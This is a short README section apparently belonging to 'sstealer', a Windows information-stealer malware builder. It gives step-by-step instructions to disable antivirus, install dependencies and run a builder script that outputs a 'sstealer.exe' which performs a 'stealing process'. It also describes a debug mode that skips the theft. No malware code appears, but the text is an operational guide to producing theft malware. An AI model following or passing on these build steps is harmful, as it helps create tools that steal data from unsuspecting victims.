## Try it out
0. You should turn off your antivirus before doing any of the next steps so it doesn't interfere with the building process.
1. Download and install the latest version of [**Python**](https://python.org) with `Add python.exe to PATH` option enabled.
2. Download the [**Source Code ZIP**](https://github.com/sqdnoises/sstealer/archive/refs/heads/main.zip), unzip it and open the unzipped folder.
3. Open the [`install.bat`](install.bat) file to install required dependencies.
4. Run the builder by opening the [`builder.pyw`](builder.pyw) file.\
(If that doesn't work, open a terminal in the source code folder and run `python builder.pyw`.)
5. Follow the instructions on the builder to build the EXE.\
The built file will be located in a new folder called `dist` with the name `sstealer.exe`.

*Windows 10/11 required for builder; Built EXE will only run on Windows 10/11.*

-> **`Debug Mode` option**\
When an exe is built with the `Debug Mode` option checked, the exe doesn't run the stealing process, rather shows a message box informing it is currently in debug mode instead of stealing for testing and experimenting purposes.
